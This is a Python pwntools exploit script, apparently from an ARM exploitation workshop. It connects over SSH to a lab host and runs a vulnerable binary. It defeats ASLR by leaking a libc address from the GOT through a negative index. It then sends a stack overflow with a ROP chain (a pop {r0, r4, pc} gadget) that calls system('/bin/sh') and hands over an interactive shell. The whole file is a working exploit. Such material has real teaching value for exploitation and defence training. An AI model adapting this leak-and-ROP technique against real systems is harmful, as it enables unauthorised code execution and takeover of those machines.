#!/usr/bin/env python2

from pwn import *

ip = "192.168.1.100"
port = 22
user = "user1"
pwd = "pass1"

libc = ELF('/home/arm/Workshop/exploits/gadgets/libc-2.24.so')

shell = ssh(user, ip, password=pwd, port=port)

sh = shell.run('/home/user1/Workshop/exploits/stack_aslr/stack_aslr')

gadget_offset = 0x0007753c

sh.recvuntil('read: \n')
sh.sendline('-14')                # offset to the libc in the GOT section
ret = sh.recvline().split()
libc_main = int(ret[6])

libc_base = libc_main - libc.symbols['__libc_start_main']

rop_gadget = libc_base + gadget_offset
system_address = libc_base + libc.symbols['system']
shell_address = libc_base + next(libc.search("/bin/sh"))
log.info('libcbase: %#x' % libc_base)
log.info('system_address: %#x' % system_address)
log.info('shell_address: %#x' % shell_address)

sh.recvuntil('Overflow it!')
payload = "A"*20
payload += p32(rop_gadget)       # gadget address - pop {r0, r4, pc}
payload += p32(shell_address)    # r0 - address of /bin/sh
payload += p32(0x42424242)       # r4 - not important
payload += p32(system_address)   # pc - system address
sh.sendline(payload)

sh.interactive()
shell.close()